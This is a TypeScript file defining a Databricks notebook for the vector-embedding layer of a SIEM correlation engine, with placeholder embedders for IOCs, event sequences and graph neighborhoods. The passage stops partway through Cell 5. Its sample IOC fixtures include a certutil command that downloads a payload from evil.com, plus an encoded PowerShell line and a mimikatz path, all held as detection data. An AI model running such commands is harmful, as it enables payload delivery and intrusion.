import { DatabricksNotebook } from '../databricksNotebooks';

export const graphCorrelationVectorMemoryNotebook: DatabricksNotebook = {
  id: 'graph-correlation-vector-memory',
  title: 'SIEM Graph Correlation Engine - Vector & AI Memory Infrastructure',
  subtitle: 'Semantic IOC similarity, behavioral sequence embeddings, graph neighborhood vectors, Ray batch/serve',
  category: 'correlation',
  tags: ['Vector Search', 'Embeddings', 'Ray', 'Semantic Similarity', 'IOC', 'Incident Memory', 'Graph Neighborhoods', 'CTI'],
  description: 'Part 4 of the SIEM Graph Correlation Engine. Adds a semantic and behavioral similarity layer that augments (not replaces) exact graph correlation. Implements 4 embedding pipelines (IOC artifacts, event sequences, graph neighborhoods, incident memory), 3 separate vector indexes, Ray Data batch processing, Ray Serve online inference APIs, and a security-specific contrastive embedding model for ATT&CK-aware similarity.',
  estimatedRuntime: '25 min (batch) + streaming',
  clusterRequirements: 'DBR 14.3 LTS ML, 8+ workers, Ray 2.9+, Mosaic AI Vector Search, Unity Catalog',
  cells: [
    {
      type: 'markdown',
      content: `# SIEM Graph Correlation Engine - Part 4: Vector & AI Memory Infrastructure

## Design Philosophy

> **Vectors augment correlation. They do not replace it.**

Spark Structured Streaming remains the source of truth for exact event-time correlation,
graph relationship tracking, partial attack-chain state, and risk scoring.

The vector layer adds **semantic memory** -- the ability to say "this pattern looks like
something we've seen before" and "this IOC is semantically similar to known-bad indicators
from campaign X."

### Architecture

\`\`\`
                    SPARK STREAMING (Source of Truth)
                    +--------------------------------+
                    | Event correlation               |
                    | Graph relationships             |
                    | Attack-chain state              |
                    | Risk scoring                    |
                    +-------+------------------------+
                            |
                            | suspicious patterns
                            v
              +-------------+-------------+
              |    RAY SERVE (Online)      |
              |  /embed    /retrieve       |
              |  /score    /explain        |
              +---+-----------+-----------++
                  |           |            |
        +---------+   +------+------+  +--+-----------+
        | Vector  |   | Vector     |  | Vector       |
        | Index 1 |   | Index 2    |  | Index 3      |
        | IOC     |   | Behavioral |  | Graph Neigh  |
        | Semantic|   | Sequences  |  | borhood      |
        +---------+   +------------+  +--------------+

              RAY DATA (Batch)
              +--------------------------------+
              | Historical backfill            |
              | Embedding generation           |
              | Model training/fine-tuning     |
              +--------------------------------+
\`\`\`

### Embedding Object Types

| Object Type | Examples | Embedding Dim | Model |
|-------------|----------|---------------|-------|
| IOC Artifacts | domains, URLs, file paths, command lines, registry keys, email subjects, CTI text | 384 | E5-base / security-tuned |
| Event Sequences | ordered event windows, partial attack chains, behavior sequences | 256 | Custom LSTM encoder |
| Graph Neighborhoods | user-host-process-domain subgraphs, 1-hop/2-hop neighborhoods | 128 | GNN / structure2vec |
| Incident Memory | past incidents, analyst notes, response summaries, playbooks | 384 | E5-base / security-tuned |

### Vector Indexes

Three separate indexes -- **never** collapse all object types into one embedding space:

1. **semantic_ioc_index** -- IOC artifacts + CTI text
2. **behavioral_sequence_index** -- event sequences + partial attack chains
3. **graph_neighborhood_index** -- local subgraph structures`
    },
    {
      type: 'code',
      content: `# Cell 1: Vector Schema Definitions
# Creates Delta tables for all vector-related data in Unity Catalog.

from pyspark.sql import functions as F
from pyspark.sql.types import *
import json

CATALOG = "soc_platform"
SCHEMA_VECTOR = "graph_vectors"

spark.sql(f"CREATE SCHEMA IF NOT EXISTS {CATALOG}.{SCHEMA_VECTOR}")

# ── IOC Embeddings Table ──────────────────────────────────────────────
spark.sql(f"""
CREATE TABLE IF NOT EXISTS {CATALOG}.{SCHEMA_VECTOR}.ioc_embeddings (
    ioc_id              STRING      NOT NULL,
    ioc_type            STRING      NOT NULL,
    ioc_value           STRING      NOT NULL,
    ioc_normalized      STRING,
    source              STRING,
    first_seen          TIMESTAMP,
    last_seen           TIMESTAMP,
    confidence          DOUBLE      DEFAULT 0.0,
    maliciousness_score DOUBLE      DEFAULT 0.0,
    mitre_techniques    ARRAY<STRING>,
    campaign_ids        ARRAY<STRING>,
    embedding           ARRAY<FLOAT>,
    embedding_model     STRING,
    embedding_version   INT         DEFAULT 1,
    metadata_json       STRING,
    created_at          TIMESTAMP   DEFAULT current_timestamp(),
    updated_at          TIMESTAMP   DEFAULT current_timestamp()
)
USING DELTA
TBLPROPERTIES (
    'delta.enableChangeDataFeed' = 'true',
    'delta.autoOptimize.optimizeWrite' = 'true'
)
""")

# ── Event Sequence Embeddings Table ───────────────────────────────────
spark.sql(f"""
CREATE TABLE IF NOT EXISTS {CATALOG}.{SCHEMA_VECTOR}.sequence_embeddings (
    sequence_id         STRING      NOT NULL,
    entity_id           STRING      NOT NULL,
    entity_type         STRING,
    sequence_type       STRING      NOT NULL,
    event_actions       ARRAY<STRING>,
    event_count         INT,
    time_span_seconds   DOUBLE,
    is_compressed       BOOLEAN     DEFAULT false,
    mitre_stages        ARRAY<STRING>,
    intent_stage        STRING,
    kill_chain_progress DOUBLE      DEFAULT 0.0,
    attack_chain_id     STRING,
    campaign_id         STRING,
    embedding           ARRAY<FLOAT>,
    embedding_model     STRING,
    embedding_version   INT         DEFAULT 1,
    is_known_malicious  BOOLEAN     DEFAULT false,
    is_confirmed_benign BOOLEAN     DEFAULT false,
    label               STRING,
    window_start        TIMESTAMP,
    window_end          TIMESTAMP,
    created_at          TIMESTAMP   DEFAULT current_timestamp()
)
USING DELTA
TBLPROPERTIES (
    'delta.enableChangeDataFeed' = 'true',
    'delta.autoOptimize.optimizeWrite' = 'true'
)
""")

# ── Graph Neighborhood Embeddings Table ───────────────────────────────
spark.sql(f"""
CREATE TABLE IF NOT EXISTS {CATALOG}.{SCHEMA_VECTOR}.neighborhood_embeddings (
    neighborhood_id     STRING      NOT NULL,
    center_entity_id    STRING      NOT NULL,
    center_entity_type  STRING,
    hop_depth           INT         DEFAULT 1,
    vertex_count        INT,
    edge_count          INT,
    entity_types        ARRAY<STRING>,
    edge_types          ARRAY<STRING>,
    structural_hash     STRING,
    risk_score          DOUBLE      DEFAULT 0.0,
    has_critical_node   BOOLEAN     DEFAULT false,
    has_honeypot        BOOLEAN     DEFAULT false,
    has_lateral_movement BOOLEAN    DEFAULT false,
    topology_json       STRING,
    embedding           ARRAY<FLOAT>,
    embedding_model     STRING,
    embedding_version   INT         DEFAULT 1,
    snapshot_time       TIMESTAMP,
    created_at          TIMESTAMP   DEFAULT current_timestamp()
)
USING DELTA
TBLPROPERTIES (
    'delta.enableChangeDataFeed' = 'true',
    'delta.autoOptimize.optimizeWrite' = 'true'
)
""")

# ── Incident Memory Table ─────────────────────────────────────────────
spark.sql(f"""
CREATE TABLE IF NOT EXISTS {CATALOG}.{SCHEMA_VECTOR}.incident_memory (
    incident_id         STRING      NOT NULL,
    incident_type       STRING      NOT NULL,
    incident_title      STRING,
    incident_summary    STRING,
    severity            STRING,
    status              STRING      DEFAULT 'closed',
    mitre_tactics       ARRAY<STRING>,
    mitre_techniques    ARRAY<STRING>,
    involved_entities   ARRAY<STRING>,
    involved_iocs       ARRAY<STRING>,
    attack_chain_ids    ARRAY<STRING>,
    campaign_id         STRING,
    detection_types     ARRAY<STRING>,
    response_summary    STRING,
    remediation_steps   ARRAY<STRING>,
    analyst_notes       STRING,
    playbook_id         STRING,
    lessons_learned     STRING,
    false_positive      BOOLEAN     DEFAULT false,
    embedding           ARRAY<FLOAT>,
    embedding_model     STRING,
    embedding_version   INT         DEFAULT 1,
    incident_start      TIMESTAMP,
    incident_end        TIMESTAMP,
    created_at          TIMESTAMP   DEFAULT current_timestamp()
)
USING DELTA
TBLPROPERTIES (
    'delta.enableChangeDataFeed' = 'true',
    'delta.autoOptimize.optimizeWrite' = 'true'
)
""")

# ── Vector Index Configuration Table ──────────────────────────────────
spark.sql(f"""
CREATE TABLE IF NOT EXISTS {CATALOG}.{SCHEMA_VECTOR}.vector_index_config (
    index_name          STRING      NOT NULL,
    source_table        STRING      NOT NULL,
    embedding_column    STRING      DEFAULT 'embedding',
    embedding_dimension INT,
    similarity_metric   STRING      DEFAULT 'cosine',
    index_type          STRING      DEFAULT 'DELTA_SYNC',
    status              STRING      DEFAULT 'active',
    last_sync_time      TIMESTAMP,
    row_count           LONG        DEFAULT 0,
    config_json         STRING,
    created_at          TIMESTAMP   DEFAULT current_timestamp(),
    updated_at          TIMESTAMP   DEFAULT current_timestamp()
)
USING DELTA
""")

print("Vector schema tables created:")
for t in spark.catalog.listTables(f"{CATALOG}.{SCHEMA_VECTOR}"):
    print(f"  {t.name}")`
    },
    {
      type: 'code',
      content: `# Cell 2: Mosaic AI Vector Search Index Creation
# Creates 3 separate vector indexes -- one per embedding space.

from databricks.vector_search.client import VectorSearchClient

vsc = VectorSearchClient()

VECTOR_ENDPOINT = "soc_vector_endpoint"

try:
    vsc.create_endpoint(name=VECTOR_ENDPOINT, endpoint_type="STANDARD")
    print(f"Created vector search endpoint: {VECTOR_ENDPOINT}")
except Exception as e:
    if "already exists" in str(e).lower():
        print(f"Endpoint {VECTOR_ENDPOINT} already exists")
    else:
        print(f"Endpoint note: {str(e)[:200]}")

INDEX_CONFIGS = [
    {
        "name": "semantic_ioc_index",
        "source_table": f"{CATALOG}.{SCHEMA_VECTOR}.ioc_embeddings",
        "primary_key": "ioc_id",
        "embedding_dimension": 384,
        "embedding_column": "embedding",
        "sync_mode": "TRIGGERED",
        "columns": [
            "ioc_id", "ioc_type", "ioc_value", "ioc_normalized", "source",
            "confidence", "maliciousness_score", "mitre_techniques", "campaign_ids",
        ],
    },
    {
        "name": "behavioral_sequence_index",
        "source_table": f"{CATALOG}.{SCHEMA_VECTOR}.sequence_embeddings",
        "primary_key": "sequence_id",
        "embedding_dimension": 256,
        "embedding_column": "embedding",
        "sync_mode": "TRIGGERED",
        "columns": [
            "sequence_id", "entity_id", "sequence_type", "event_actions",
            "mitre_stages", "intent_stage", "kill_chain_progress",
            "attack_chain_id", "campaign_id", "is_known_malicious", "label",
        ],
    },
    {
        "name": "graph_neighborhood_index",
        "source_table": f"{CATALOG}.{SCHEMA_VECTOR}.neighborhood_embeddings",
        "primary_key": "neighborhood_id",
        "embedding_dimension": 128,
        "embedding_column": "embedding",
        "sync_mode": "TRIGGERED",
        "columns": [
            "neighborhood_id", "center_entity_id", "center_entity_type",
            "hop_depth", "vertex_count", "edge_count",
            "risk_score", "has_critical_node", "has_honeypot",
            "has_lateral_movement", "structural_hash",
        ],
    },
]

for config in INDEX_CONFIGS:
    index_name = f"{CATALOG}.{SCHEMA_VECTOR}.{config['name']}"
    try:
        vsc.create_delta_sync_index(
            endpoint_name=VECTOR_ENDPOINT,
            index_name=index_name,
            source_table_name=config["source_table"],
            pipeline_type="TRIGGERED",
            primary_key=config["primary_key"],
            embedding_dimension=config["embedding_dimension"],
            embedding_vector_column=config["embedding_column"],
            columns_to_sync=config["columns"],
        )
        print(f"Created index: {config['name']} (dim={config['embedding_dimension']})")
    except Exception as e:
        if "already exists" in str(e).lower():
            print(f"Index {config['name']} already exists")
        else:
            print(f"Index {config['name']} note: {str(e)[:200]}")

    spark.sql(f"""
        INSERT INTO {CATALOG}.{SCHEMA_VECTOR}.vector_index_config
        VALUES (
            '{config["name"]}', '{config["source_table"]}',
            '{config["embedding_column"]}', {config["embedding_dimension"]},
            'cosine', 'DELTA_SYNC', 'active', current_timestamp(), 0,
            '{json.dumps(config)}', current_timestamp(), current_timestamp()
        )
    """)

print(f"\\nVector search endpoint: {VECTOR_ENDPOINT}")
print(f"Indexes configured: {len(INDEX_CONFIGS)}")`
    },
    {
      type: 'code',
      content: `# Cell 3: IOC Embedding Pipeline
# Generates semantic embeddings for IOC artifacts: domains, URLs, file paths,
# command lines, registry keys, email subjects, CTI text.

import hashlib, uuid, math
from datetime import datetime, timedelta

IOC_EMBEDDING_DIM = 384
SEQ_EMBEDDING_DIM = 256
GRAPH_EMBEDDING_DIM = 128

class IOCEmbedder:
    """
    Production implementation uses Databricks Foundation Model API or
    a fine-tuned E5-base model. This class defines the interface and
    provides deterministic hash-based embeddings for pipeline validation.
    """
    def __init__(self, model_name="e5-base-security-v1", dim=IOC_EMBEDDING_DIM):
        self.model_name = model_name
        self.dim = dim

    def normalize_ioc(self, ioc_type, ioc_value):
        v = ioc_value.strip().lower()
        if ioc_type == "domain":
            v = v.rstrip(".")
            if v.startswith("www."):
                v = v[4:]
        elif ioc_type == "url":
            if "://" in v:
                v = v.split("://", 1)[1]
            v = v.rstrip("/")
        elif ioc_type == "file_path":
            v = v.replace("\\\\", "/")
        elif ioc_type == "command_line":
            parts = v.split()
            parts = [p for p in parts if not p.startswith("-")]
            v = " ".join(parts[:20])
        elif ioc_type == "registry_key":
            v = v.replace("hkey_local_machine", "hklm")
            v = v.replace("hkey_current_user", "hkcu")
        return v

    def build_prompt(self, ioc_type, normalized_value):
        type_prefix = {
            "domain": "security indicator domain name:",
            "url": "security indicator URL:",
            "file_path": "security indicator file path:",
            "command_line": "security indicator command execution:",
            "registry_key": "security indicator registry modification:",
            "email_subject": "security indicator phishing email subject:",
            "cti_text": "cyber threat intelligence report:",
        }
        prefix = type_prefix.get(ioc_type, "security indicator:")
        return f"{prefix} {normalized_value}"

    def embed(self, ioc_type, ioc_value):
        normalized = self.normalize_ioc(ioc_type, ioc_value)
        prompt = self.build_prompt(ioc_type, normalized)

        # Production: call Databricks Foundation Model API
        # embedding = foundation_model_client.embeddings.create(
        #     model=self.model_name,
        #     input=[prompt]
        # ).data[0].embedding

        # Pipeline validation: deterministic hash-based embedding
        h = hashlib.sha256(prompt.encode()).digest()
        embedding = []
        for i in range(self.dim):
            byte_idx = i % len(h)
            val = ((h[byte_idx] + i * 7) % 256) / 255.0
            embedding.append(round(val * 2.0 - 1.0, 6))

        norm = math.sqrt(sum(x * x for x in embedding))
        embedding = [round(x / max(norm, 1e-8), 6) for x in embedding]

        return {
            "normalized": normalized,
            "prompt": prompt,
            "embedding": embedding,
            "model": self.model_name,
        }


ioc_embedder = IOCEmbedder()

SAMPLE_IOCS = [
    ("domain", "evil-c2-server.xyz", "threat_feed", 0.95, ["T1071.001"], ["CAMP-APT29"]),
    ("domain", "malware-download.ru", "threat_feed", 0.90, ["T1071.001"], ["CAMP-APT29"]),
    ("domain", "legitimate-cdn.com", "baseline", 0.05, [], []),
    ("url", "https://evil-c2-server.xyz/beacon/stage2", "sandbox", 0.98, ["T1071.001", "T1059"], ["CAMP-APT29"]),
    ("url", "https://pastebin.com/raw/abc123", "osint", 0.70, ["T1567"], []),
    ("file_path", "C:\\\\Windows\\\\Temp\\\\svchost_update.exe", "edr", 0.88, ["T1036.005"], []),
    ("file_path", "C:\\\\Users\\\\admin\\\\AppData\\\\Local\\\\Temp\\\\mimikatz.exe", "edr", 0.99, ["T1003"], []),
    ("file_path", "/usr/bin/python3", "baseline", 0.01, [], []),
    ("command_line", "powershell -enc SQBFAFgAIAAoA...", "edr", 0.95, ["T1059.001", "T1027"], []),
    ("command_line", "certutil -urlcache -split -f http://evil.com/payload.exe", "edr", 0.92, ["T1105"], []),
    ("command_line", "whoami /all && net user && net group", "edr", 0.80, ["T1033", "T1087"], []),
    ("registry_key", "HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\svcupdate", "edr", 0.85, ["T1547.001"], []),
    ("email_subject", "Urgent: Your account has been compromised - verify now", "email_gw", 0.90, ["T1566.001"], []),
    ("email_subject", "Invoice #INV-2024-8832 attached", "email_gw", 0.75, ["T1566.001"], []),
    ("cti_text", "APT29 campaign leveraging Cobalt Strike beacons over DNS tunneling with DGA domains", "cti_report", 0.99, ["T1071.004", "T1568.002"], ["CAMP-APT29"]),
    ("cti_text", "FIN7 deploying CARBANAK backdoor via spear-phishing with macro-enabled documents targeting financial sector", "cti_report", 0.99, ["T1566.001", "T1059.005"], ["CAMP-FIN7"]),
]

ioc_records = []
for ioc_type, ioc_value, source, confidence, techniques, campaigns in SAMPLE_IOCS:
    result = ioc_embedder.embed(ioc_type, ioc_value)
    ioc_records.append({
        "ioc_id": hashlib.md5(f"{ioc_type}:{result['normalized']}".encode()).hexdigest()[:16],
        "ioc_type": ioc_type,
        "ioc_value": ioc_value,
        "ioc_normalized": result["normalized"],
        "source": source,
        "first_seen": datetime.now() - timedelta(days=30),
        "last_seen": datetime.now(),
        "confidence": confidence,
        "maliciousness_score": confidence,
        "mitre_techniques": techniques,
        "campaign_ids": campaigns,
        "embedding": result["embedding"],
        "embedding_model": result["model"],
        "embedding_version": 1,
        "metadata_json": json.dumps({"prompt": result["prompt"]}),
    })

df_ioc = spark.createDataFrame(ioc_records)
df_ioc = (
    df_ioc
    .withColumn("first_seen", F.to_timestamp("first_seen"))
    .withColumn("last_seen", F.to_timestamp("last_seen"))
    .withColumn("created_at", F.current_timestamp())
    .withColumn("updated_at", F.current_timestamp())
)
df_ioc.write.mode("overwrite").saveAsTable(f"{CATALOG}.{SCHEMA_VECTOR}.ioc_embeddings")

print(f"IOC embeddings generated: {len(ioc_records)}")
for ioc_type in set(r["ioc_type"] for r in ioc_records):
    count = sum(1 for r in ioc_records if r["ioc_type"] == ioc_type)
    print(f"  {ioc_type:15s}: {count}")`
    },
    {
      type: 'code',
      content: `# Cell 4: Event Sequence Embedding Pipeline
# Encodes ordered security-event windows, partial attack chains, and
# login/process/network/API behavior sequences into fixed-size vectors.

class SequenceEmbedder:
    """
    Encodes variable-length event sequences into fixed-dimension vectors.
    Production: custom LSTM/Transformer encoder trained on security event logs.
    Validation: deterministic structural encoding.
    """

    ACTION_VOCAB = {
        "authentication:login_failed": 1, "authentication:login_success": 2,
        "authentication:privilege_grant": 3, "authentication:account_lockout": 4,
        "endpoint:process_create": 5, "endpoint:file_write": 6,
        "endpoint:registry_mod": 7, "endpoint:dll_load": 8,
        "endpoint:network_connect": 9,
        "dns:query": 10, "network_flow:None": 11,
        "cloud_api:CreateAccessKey": 12, "cloud_api:AssumeRole": 13,
        "cloud_api:GetObject": 14, "cloud_api:PutObject": 15,
        "cloud_api:DeleteTrail": 16, "cloud_api:StopLogging": 17,
        "deception:ssh_attempt": 18, "deception:credential_test": 19,
        "deception:http_probe": 20,
    }

    MITRE_STAGE_MAP = {
        "reconnaissance": 0.1, "credential_access": 0.2,
        "initial_access": 0.3, "execution": 0.4,
        "persistence": 0.5, "privilege_escalation": 0.6,
        "lateral_movement": 0.7, "collection": 0.8,
        "exfiltration": 0.9, "command_and_control": 0.85,
        "impact": 1.0,
    }

    def __init__(self, model_name="seq-encoder-security-v1", dim=SEQ_EMBEDDING_DIM):
        self.model_name = model_name
        self.dim = dim

    def encode_sequence(self, actions, time_span_sec=None, mitre_stages=None):
        feature_vec = [0.0] * self.dim

        for i, action in enumerate(actions[:50]):
            token = self.ACTION_VOCAB.get(action, 0)
            if token > 0:
                base_idx = (token * 11) % self.dim
                feature_vec[base_idx] += 1.0
                position_idx = (base_idx + i * 3) % self.dim
                feature_vec[position_idx] += 0.5 * (1.0 / (i + 1))

        bigram_section_start = self.dim // 2
        for i in range(len(actions) - 1):
            t1 = self.ACTION_VOCAB.get(actions[i], 0)
            t2 = self.ACTION_VOCAB.get(actions[i + 1], 0)
            bigram_idx = bigram_section_start + ((t1 * 23 + t2 * 7) % (self.dim // 4))
            feature_vec[bigram_idx] += 1.0

        feature_vec[0] = len(actions) / 50.0
        feature_vec[1] = len(set(actions)) / max(len(actions), 1)

        if time_span_sec is not None:
            feature_vec[2] = min(time_span_sec / 3600.0, 1.0)
            if len(actions) > 1:
                feature_vec[3] = time_span_sec / max(len(actions), 1) / 60.0

        if mitre_stages:
            for stage in mitre_stages:
                stage_val = self.MITRE_STAGE_MAP.get(stage, 0.0)
                idx = 4 + int(stage_val * 10)
                if idx < self.dim:
                    feature_vec[idx] = stage_val

            max_stage = max(self.MITRE_STAGE_MAP.get(s, 0) for s in mitre_stages)
            feature_vec[15] = max_stage
            feature_vec[16] = len(mitre_stages) / 11.0

        norm = math.sqrt(sum(x * x for x in feature_vec))
        if norm > 0:
            feature_vec = [round(x / norm, 6) for x in feature_vec]

        return {
            "embedding": feature_vec,
            "model": self.model_name,
            "action_count": len(actions),
            "unique_actions": len(set(actions)),
        }


seq_embedder = SequenceEmbedder()

SAMPLE_SEQUENCES = [
    {
        "name": "password_spray_success",
        "entity_id": "user-attacker-01",
        "sequence_type": "attack_chain",
        "actions": [
            "authentication:login_failed", "authentication:login_failed",
            "authentication:login_failed", "authentication:login_failed",
            "authentication:login_success", "endpoint:process_create",
            "endpoint:network_connect",
        ],
        "time_span": 180.0, "stages": ["credential_access", "initial_access", "execution"],
        "intent": "lateral_movement", "chain_progress": 0.27,
        "is_malicious": True, "label": "password_spray",
    },
    {
        "name": "full_apt_chain",
        "entity_id": "user-apt-actor",
        "sequence_type": "attack_chain",
        "actions": [
            "dns:query", "authentication:login_failed", "authentication:login_success",
            "endpoint:process_create", "endpoint:registry_mod",
            "authentication:privilege_grant", "endpoint:network_connect",
            "cloud_api:CreateAccessKey", "cloud_api:AssumeRole",
            "cloud_api:GetObject", "cloud_api:PutObject",
        ],
        "time_span": 7200.0,
        "stages": ["reconnaissance", "credential_access", "initial_access",
                    "execution", "persistence", "privilege_escalation",
                    "lateral_movement", "collection", "exfiltration"],
        "intent": "exfiltration", "chain_progress": 0.82,
        "is_malicious": True, "label": "apt_full_chain",
    },
    {
        "name": "normal_admin_activity",
        "entity_id": "user-sysadmin-01",
        "sequence_type": "behavior_window",
        "actions": [
            "authentication:login_success", "endpoint:process_create",
            "endpoint:file_write", "authentication:login_success",
            "endpoint:process_create",
        ],
        "time_span": 28800.0, "stages": ["initial_access", "execution"],
        "intent": "unknown", "chain_progress": 0.0,
        "is_malicious": False, "label": "normal_admin",
    },
    {
        "name": "cloud_cred_abuse",
        "entity_id": "user-cloud-01",
        "sequence_type": "attack_chain",
        "actions": [
            "cloud_api:CreateAccessKey", "cloud_api:AssumeRole",
            "cloud_api:GetObject", "cloud_api:GetObject",
            "cloud_api:PutObject", "cloud_api:DeleteTrail",
        ],
        "time_span": 600.0,
        "stages": ["credential_access", "privilege_escalation", "collection", "exfiltration", "impact"],
        "intent": "exfiltration", "chain_progress": 0.55,
        "is_malicious": True, "label": "cloud_abuse",
    },
    {
        "name": "lateral_movement_chain",
        "entity_id": "user-lateral-01",
        "sequence_type": "attack_chain",
        "actions": [
            "authentication:login_success", "endpoint:process_create",
            "endpoint:network_connect", "authentication:login_success",
            "endpoint:process_create", "endpoint:network_connect",
            "authentication:login_success",
        ],
        "time_span": 1200.0,
        "stages": ["initial_access", "execution", "lateral_movement"],
        "intent": "lateral_movement", "chain_progress": 0.36,
        "is_malicious": True, "label": "lateral_movement",
    },
    {
        "name": "honeypot_interaction",
        "entity_id": "user-suspect-01",
        "sequence_type": "deception_sequence",
        "actions": [
            "deception:http_probe", "deception:ssh_attempt",
            "deception:credential_test", "deception:credential_test",
        ],
        "time_span": 120.0,
        "stages": ["reconnaissance", "credential_access"],
        "intent": "credential_access", "chain_progress": 0.18,
        "is_malicious": True, "label": "honeypot_attacker",
    },
]

seq_records = []
for sample in SAMPLE_SEQUENCES:
    result = seq_embedder.encode_sequence(
        sample["actions"], sample["time_span"], sample["stages"]
    )
    seq_records.append({
        "sequence_id": f"seq-{uuid.uuid4().hex[:12]}",
        "entity_id": sample["entity_id"],
        "entity_type": "user",
        "sequence_type": sample["sequence_type"],
        "event_actions": sample["actions"],
        "event_count": len(sample["actions"]),
        "time_span_seconds": sample["time_span"],
        "is_compressed": sample["time_span"] < 300 and len(sample["actions"]) > 4,
        "mitre_stages": sample["stages"],
        "intent_stage": sample["intent"],
        "kill_chain_progress": sample["chain_progress"],
        "attack_chain_id": None,
        "campaign_id": None,
        "embedding": result["embedding"],
        "embedding_model": result["model"],
        "embedding_version": 1,
        "is_known_malicious": sample["is_malicious"],
        "is_confirmed_benign": not sample["is_malicious"],
        "label": sample["label"],
        "window_start": datetime.now() - timedelta(hours=2),
        "window_end": datetime.now(),
    })

df_seq = spark.createDataFrame(seq_records)
df_seq = (
    df_seq
    .withColumn("window_start", F.to_timestamp("window_start"))
    .withColumn("window_end", F.to_timestamp("window_end"))
    .withColumn("created_at", F.current_timestamp())
)
df_seq.write.mode("overwrite").saveAsTable(f"{CATALOG}.{SCHEMA_VECTOR}.sequence_embeddings")

print(f"Sequence embeddings generated: {len(seq_records)}")
for st in set(r["sequence_type"] for r in seq_records):
    count = sum(1 for r in seq_records if r["sequence_type"] == st)
    print(f"  {st:25s}: {count}")`
    },
    {
      type: 'code',
      content: `# Cell 5: Graph Neighborhood Embedding Pipeline
# Encodes local subgraph structures (1-hop, 2-hop) around suspicious entities
# into fixed-size vectors using structure2vec-style encoding.

class GraphNeighborhoodEmbedder:
    """
    Encodes local graph topology into fixed-size vectors.
    Production: GNN encoder (GraphSAGE / structure2vec) trained on SOC graphs.
    Validation: structural feature encoding.
    """
    ENTITY_TYPE_MAP = {"ip": 0, "user": 1, "host": 2, "domain": 3, "process": 4, "cloud": 5}
    EDGE_TYPE_MAP = {
        "authentication:login_failed": 0, "authentication:login_success": 1,
        "authentication:privilege_grant": 2, "endpoint:process_create": 3,
        "endpoint:network_connect": 4, "endpoint:file_write": 5,
        "dns:query": 6, "cloud_api:AssumeRole": 7,
    }

    def __init__(self, model_name="graph-struct2vec-v1", dim=GRAPH_EMBEDDING_DIM):
        self.model_name = model_name
        self.dim = dim

    def encode_neighborhood(self, center_id, vertices, edges, hop_depth=1):
        feature_vec = [0.0] * self.dim

        entity_type_counts = {}
        for v in vertices:
            et = v.get("entity_type", "unknown")
            entity_type_counts[et] = entity_type_counts.get(et, 0) + 1

        for et, count in entity_type_counts.items():
            idx = self.ENTITY_TYPE_MAP.get(et, 6)
            if idx < self.dim:
                feature_vec[idx] = count / max(len(vertices), 1)

        edge_type_counts = {}
        for e in edges:
            et = e.get("edge_type", "unknown")
            base_type = et.split(":")[0] + ":" + et.split(":")[-1] if ":" in et else et
            edge_type_counts[base_type] = edge_type_counts.get(base_type, 0) + 1

        for et, count in edge_type_counts.items():
            idx = 10 + self.EDGE_TYPE_MAP.get(et, 8)
            if idx < self.dim:
                feature_vec[idx] = count / max(len(edges), 1)

        feature_vec[20] = len(vertices) / 100.0
        feature_vec[21] = len(edges) / 200.0
        feature_vec[22] = len(edges) / max(len(vertices), 1) / 10.0
        feature_vec[23] = hop_depth / 3.0

        critical_count = sum(1 for v in vertices if v.get("criticality", "normal") != "normal")
        honeypot_count = sum(1 for v in vertices if v.get("is_honeypot", False))
        high_risk = sum(1 for v in vertices if (v.get("risk_score", 0) or 0) > 3.0)

        feature_vec[24] = critical_count / max(len(vertices), 1)
        feature_vec[25] = honeypot_count / max(len(vertices), 1)
        feature_vec[26] = high_risk / max(len(vertices), 1)

        total_risk = sum(v.get("risk_score", 0) or 0 for v in vertices)
        feature_vec[27] = min(total_risk / 50.0, 1.0)

        degree_map = {}
        for e in edges:
            s, d = e.get("src", ""), e.get("dst", "")
            degree_map[s] = degree_map.get(s, 0) + 1
            degree_map[d] = degree_map.get(d, 0) + 1

        if degree_map:
            degrees = list(degree_map.values())
            feature_vec[30] = max(degrees) / max(len(vertices), 1)
            feature_vec[31] = sum(degrees) / len(degrees) / max(len(vertices), 1)
            feature_vec[32] = min(degrees) / max(len(vertices), 1)

        has_lateral = any(
            "network_connect" in e.get("edge_type", "") or "lateral" in e.get("edge_type", "")
            for e in edges
        )
        has_auth_fail = any("login_failed" in e.get("edge_type", "") for e in edges)
        has_priv_esc = any("privilege" in e.get("edge_type", "") for e in edges)
        has_exfil = any("PutObject" in e.get("edge_type", "") or "exfil" in e.get("edge_type", "") for e in edges)

        feature_vec[35] = 1.0 if has_lateral else 0.0
        feature_vec[36] = 1.0 if has_auth_fail else 0.0
        feature_vec[37] = 1.0 if has_priv_esc else 0.0
        feature_vec[38] = 1.0 if has_exfil else 0.0

        struct_str = "|".join(sorted(
            f"{e.get('src','')}-{e.get('edge_type','')}-{e.get('dst','')}" for e in edges
        ))
        structural_hash = hashlib.md5(struct_str.encode()).hexdigest()

        norm = math.sqrt(sum(x * x for x in feature_vec))
        if norm > 0:
            feature_vec = [round(x / norm, 6) for x in feature_vec]

        return {
            "embedding": feature_vec,
            "model": self.model_name,
            "structural_hash": structural_hash,
            "vertex_count": len(vertices),
            "edge_count": len(edges),
            "entity_types": list(entity_type_counts.keys()),
            "edge_types": list(edge_type_counts.keys()),
            "has_critical": critical_count > 0,
            "has_honeypot": honeypot_count > 0,
            "has_lateral": has_lateral,
            "risk_score": total_risk,
        }


graph_embedder = GraphNeighborhoodEmbedder()

GRAPH_LIVE = "graph_live"
df_v = spark.table(f"{CATALOG}.{GRAPH_LIVE}.vertices_current")
df_e = spark.table(f"{CATALOG}.{GRAPH_LIVE}.edges_current")
df_es = spark.table(f"{CATALOG}.{GRAPH_LIVE}.entity_state_current")

high_risk_entities = (
    df_es.filter(F.col("rolling_risk_score") > 2.0)
    .orderBy(F.desc("rolling_risk_score"))
    .limit(50)
    .select("entity_id")
    .collect()
)

neighborhood_records = []
for row in high_risk_entities:
    center_id = row["entity_id"]

    neighbor_edges = (
        df_e.filter((F.col("src_vertex_id") == center_id) | (F.col("dst_vertex_id") == center_id))
        .limit(100)
        .collect()
    )

    neighbor_ids = set()
    edge_dicts = []
    for e in neighbor_edges:
        neighbor_ids.add(e["src_vertex_id"])
        neighbor_ids.add(e["dst_vertex_id"])
        edge_dicts.append({
            "src": e["src_vertex_id"], "dst": e["dst_vertex_id"],
            "edge_type": e["edge_type"], "weight": e["weight"],
        })

    vertex_dicts = []
    if neighbor_ids:
        neighbor_verts = (
            df_v.filter(F.col("vertex_id").isin(list(neighbor_ids)))
            .limit(100)
            .collect()
        )
        for v in neighbor_verts:
            vertex_dicts.append({
                "vertex_id": v["vertex_id"], "entity_type": v["entity_type"],
                "risk_score": v["risk_score"], "criticality": v["criticality"],
